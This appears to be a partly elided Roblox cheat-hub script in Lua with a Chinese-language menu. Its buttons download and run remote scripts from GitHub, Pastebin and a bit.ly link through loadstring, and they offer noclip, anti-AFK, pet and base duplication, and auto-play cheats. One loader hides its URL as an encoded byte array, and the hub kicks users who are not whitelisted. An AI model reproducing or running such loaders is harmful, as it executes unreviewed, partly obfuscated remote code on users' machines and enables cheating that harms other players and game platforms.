...
local credits = creds:section("玩家类通用",true)
...
ab.Text="你闲置了，ROBLOX 试图踢你，但我们反映了它！"wait(2)ab.Text="脚本重新启用"end)
    ...
    credits:Toggle("穿墙只能开不能关", "", false, function(Value)
...
local creds = window:Tab("普通",'6035145364')    
local credits = creds:section("打开")
...
Section:Button("水下卡密fish", function()
    loadstring(game:HttpGet(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,106,115,105,100,106,100,110,110,115,110,115,110,115,47,115,106,115,105,100,106,100,110,110,115,110,115,110,115,47,109,97,105,110,47,82,69,65,68,77,69,46,109,100,34,41,41,40,41})end)())))();
end)
  
Section:Button("道庭缝合卡密道庭脚本FMAK", function()
...
loadstring(game:HttpGet("https://raw.githubusercontent.com/4v5n7n/lll/main/13822889.lua"))("道庭DT V2.0")  
    ...
    credits:Button("有真无敌",function()
        loadstring(game:HttpGet(("https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Slap%20Battles")))()
    end)
    
    local credits = creds:section("能力战争ability wars")
    
    credits:Button("汉化版",function()
        loadstring(game:HttpGet("https://pastebin.com/raw/tDN0uMkk"))()
    end)
    
    local credits = creds:section("伐木大亨2")
    
    credits:Button("step版可以复制基地",function()
        loadstring(Game:HttpGet("https://bit.ly/Stepshop"))("StepLT2")
    end)
    
    credits:Button("一个开源的部分不能用",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/frencaliber/LuaWareLoader.lw/main/luawareloader.wtf",true))()
    end)
    
    local credits = creds:section("动感星期五")
    
    credits:Button("自动玩100%完美",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ShowerHead-FluxTeam/scripts/main/funky-friday-autoplay"))()
    end)
    
    local credits = creds:section("起床战争")
    
    credits:Button("伪vape",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
    end)
    
    local credits = creds:section("我的餐厅")
    ...
    local credits = creds:section("收养我吧")
    
    credits:Button("可复制宠物",function()
        loadstring(game:HttpGet("https://pastebin.com/raw/uBpUr2vU"))()
    end)
    
    local credits = creds:section("俄亥俄洲")
    
    credits:Button("汉化版功能弱",function()
        loadstring(game:HttpGet("https://pastebin.com/raw/hXm9KBPC"))()
    end)
    
    local credits = creds:section("警长vs杀手2")
    ...
    local credits = creds:section("逃脱evade")
    
    credits:Button("手机可用",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Evade"))()
    end)
    
    local credits = creds:section("后室Apeirophobia")
...
local creds = window:Tab("其它",'6035145364')    
    ...
    bin:Label("傻逼")
    bin:Label("脚本为免费")
    bin:Label("作者Roblox名:shushenmiao1或3")
   else
       game.Players.LocalPlayer:Kick("你没有白名单")--踢人函数
   end
